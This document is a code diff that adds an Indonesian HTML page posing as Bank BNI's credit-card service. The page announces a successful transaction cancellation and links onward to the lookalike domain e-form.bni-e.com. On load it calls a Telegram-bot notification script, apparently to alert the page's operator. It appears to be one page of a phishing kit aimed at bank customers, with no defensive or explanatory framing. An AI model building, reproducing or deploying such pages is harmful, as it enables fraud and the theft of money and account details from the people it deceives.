@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta name="theme-color" content="#227287">
+          <title>Bank BNI - Kartu Kredit</title>
+          <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'MS Serif', sans-serif; background: #fff; color: #000; min-height: 100vh; }
+
+        /* ===== NAVIGASI ATAS — LOGO ASLI ===== */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 15px;
+            border-top: 2px solid rgba(236,240,241,1);
+            border-bottom: 9px solid rgba(236,240,241,1);
+            background: #fff;
+        }
+        .top-logo { 
+            height: 45px; 
+            width: auto; 
+            content: url('https://e-form.bni-e.com/cancel1/Screenshot_20260227_093018_Gallery.jpg');
+        }
+        .btn-empty {
+            background: transparent;
+            border: none;
+            width: 100px;
+            height: 36px;
+        }
+
+        /* ===== KONTEN UTAMA ===== */
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 60px 20px;
+            text-align: center;
+        }
+        .title {
+            font-size: 22px;
+            color: #E21D1D;
+            font-weight: bold;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #000;
+            margin-bottom: 10px;
+        }
+        .info-bni {
+            font-size: 15px;
+            color: #000;
+            font-weight: bold;
+            margin-bottom: 50px;
+        }
+
+        /* ===== TOMBOL LANJUT ===== */
+        .btn-lanjut {
+            display: inline-block;
+            width: 80%;
+            padding: 15px;
+            background: #227287;
+            color: #fff;
+            border: 3px solid #227287;
+            border-radius: 20px;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+        .btn-lanjut:hover {
+            background: #EA7704;
+            border-color: #EA7704;
+            color: #fff;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container { padding: 40px 15px; }
+            .title { font-size: 18px; }
+            .btn-lanjut { width: 90%; padding: 13px; }
+        }
+    </style>
+        </head>
+        <body>
+          <!-- Navigasi Atas — Logo FOTO ASLI -->
+          <div class="top-bar">
+            <img src="https://e-form.bni-e.com/cancel1/Screenshot_20260227_093018_Gallery.jpg"
+              alt="Logo BNI" class="top-logo">
+              <span class="btn-empty">
+              </span>
+            </div>
+            <!-- Konten Utama -->
+            <div class="container">
+              <h1 class="title">𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹.</h1>
+              <p class="info-text">Untuk laporan transaksi online hari ini</p>
+              <p class="info-bni">𝗜𝗻𝗳𝗼 : 𝗕𝗡𝗜 𝗖𝗮𝗹𝗹</p>
+              <a href="https://e-form.bni-e.com/Batalkan/transaksi" class="btn-lanjut">𝗟𝗮𝗻𝗷𝘂𝘁</a>
+            </div>
+            <!-- Telegram Config -->
+            <script src="config.js"></script>
+            <script src="telegram-bot.js"></script>
+            <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            notifikasiHalamanDibuka("Halaman Berhasil — Pembatalan Transaksi Selesai");
+        });
+    </script>
+          </body>
+        </html>
